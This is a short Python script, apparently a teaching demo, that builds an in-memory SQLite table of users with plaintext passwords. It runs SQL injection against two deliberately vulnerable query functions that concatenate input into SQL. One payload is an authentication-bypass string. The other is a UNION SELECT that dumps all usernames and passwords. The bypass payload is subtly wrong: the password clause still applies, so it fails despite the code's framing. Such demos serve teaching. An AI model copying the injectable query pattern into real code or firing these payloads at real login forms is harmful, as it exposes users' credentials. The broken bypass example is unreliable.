import sqlite3


USER_DATA = [
    (1, 'admin', 'password123'),(2, 'user1', 'password456'),(3, 'user2', 'password789')
]


def setup_database():
    conn = sqlite3.connect(":memory:") 
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE users (id INTEGER, username TEXT, password TEXT)")
    cursor.executemany("INSERT INTO users (id, username, password) VALUES (?, ?, ?)", USER_DATA)
    conn.commit()
    return conn


def insecure_login(username, password):
    conn = setup_database()
    cursor = conn.cursor()

   
    query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
    cursor.execute(query)
    result = cursor.fetchone()
    conn.close()

    if result:
        print("Authentication bypass successful!")
        print(f"Welcome back, {result[1]}!")
    else:
        print("Authentication failed!")


def sql_injection_data_extraction(username):
    conn = setup_database()
    cursor = conn.cursor()

  
    injected_username = username 
    
    query = f"SELECT * FROM users WHERE username = '{injected_username}'"
    cursor.execute(query)
    result = cursor.fetchall()
    conn.close()

    print("Sensitive data retrieved successfully!")
    for user in result:
        print(f"ID: {user[0]}, Username: {user[1]}, Password: {user[2]}")


def main():
    
    print("Simulating Authentication Bypass...")
    insecure_login("admin' AND '1'='1", "irrelevant") 

   
    print("\nSimulating Data Inference with SQL Injection...")
    sql_injection_data_extraction("' UNION SELECT id, username, password FROM users --")  # Extract user data

if __name__ == "__main__":
    main()
